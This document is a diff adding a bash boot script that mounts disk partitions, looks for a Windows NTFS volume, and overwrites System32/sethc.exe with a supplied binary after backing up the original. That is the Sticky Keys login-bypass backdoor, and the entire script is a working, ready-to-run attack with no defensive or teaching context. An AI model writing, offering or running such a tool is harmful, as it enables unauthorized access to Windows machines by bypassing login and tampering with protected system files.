@@ -1,0 +1,35 @@
+#!/usr/bin/bash
+mount -t proc none /proc
+mount -t sysfs none /sys
+mount -t devtmpfs  devtmpfs  /dev
+
+insmod /lib/modules/6.2.0-26-generic/kernel/drivers/ata/libahci.ko
+insmod /lib/modules/6.2.0-26-generic/kernel/drivers/ata/ahci.ko
+
+ln -s /proc/self/fd /dev/fd # in order to use process substitution
+mkdir /mnt/c
+
+# ntfs-3g -o remove_hiberfile /dev/sda2 /mnt/c # TODO if readonly error - ask user to shutdown and now reboot
+
+while IFS= read -r device; 
+do
+    if [[ "$device" =~ ^[sh]d[a-z][1-9]$ ]]; then
+        filesystem_type=$(/usr/sbin/blkid -o value -s TYPE "/dev/${device}")
+        
+        if [[ "$filesystem_type" == "ntfs" ]]; then
+            ntfsfix "/dev/${device}" > /dev/null
+            ntfs-3g "/dev/${device}" /mnt/c
+            if [ -d "/mnt/c/Windows" ]; then
+                echo "Found Windows Partition! It's /dev/${device}"
+                cp /mnt/c/Windows/System32/sethc.exe /mnt/c/Windows/System32/oldsethc.exe 
+                cp ./sethc.exe /mnt/c/Windows/System32/sethc.exe
+                break # done searching
+            fi
+            umount "/dev/${device}"
+        fi
+    fi
+done < <(lsblk -nl -o NAME)
+
+echo "Press Return to continue"
+read
+reboot -f
